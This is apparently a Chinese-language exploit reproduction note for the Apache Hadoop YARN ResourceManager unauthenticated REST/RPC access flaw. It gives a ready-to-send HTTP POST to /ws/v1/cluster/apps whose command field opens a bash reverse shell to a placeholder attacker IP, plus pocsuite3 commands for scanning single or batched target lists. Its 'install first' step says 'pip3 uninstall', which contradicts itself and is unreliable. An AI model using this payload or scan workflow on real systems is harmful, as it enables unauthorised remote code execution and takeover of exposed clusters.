

# Apache Hadoop Yarn RPC 远程命令执行漏洞

### 漏洞描述

```py
Hadoop Yarn RPC未授权访问漏洞存在于Hadoop Yarn中负责资源管理和任务调度的ResourceManager，成因是该组件为用户提供的RPC服务默认情况下无需认证即可访问
```

### 漏洞复现

![image-20221017180158177](https://i0.hdslb.com/bfs/album/20d322d740b3a7c2268db683c45dbbd214c56f74.png)

验证请求包

```php
POST /ws/v1/cluster/apps HTTP/1.1
Host: 你的url
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 215
Content-Type: application/json

{"application-id": "application_1655112607010_0005", "application-name": "get-shell", "am-container-spec": {"commands": {"command": "/bin/bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9998 0>&1"}}, "application-type": "YARN"}
```

![image-20221017170021895](https://i0.hdslb.com/bfs/album/8d811d331d23b098e94e5c74508ec18979e4592c.png)

```py
先安装
pip3 uninstall pocsuite3
```

```py
txt批量扫描
pocsuite -r pocs/Hadoop.py -f Hadoop.txt --verify
```

![image-20221017173157708](https://i0.hdslb.com/bfs/album/c781128eb80f967e14d7bec30c64b53cae9b269b.png)

```py
再打开pocsuite3文件夹，cmd进行如下命令
单个url扫描
pocsuite -r pocs/Hadoop.py -u http://www.example.com --verify
```

![image-20221017170852801](https://i0.hdslb.com/bfs/album/cc65ba6436f7961026a1ef236eb37bd4bf71d238.png)

```py
http://你的url/ws/v1/cluster/apps/application_1655112607010_0005
```

![image-20221017165714043](https://i0.hdslb.com/bfs/album/7f71c753ba62e51f6e8e894a21ad0145bc28898e.png)
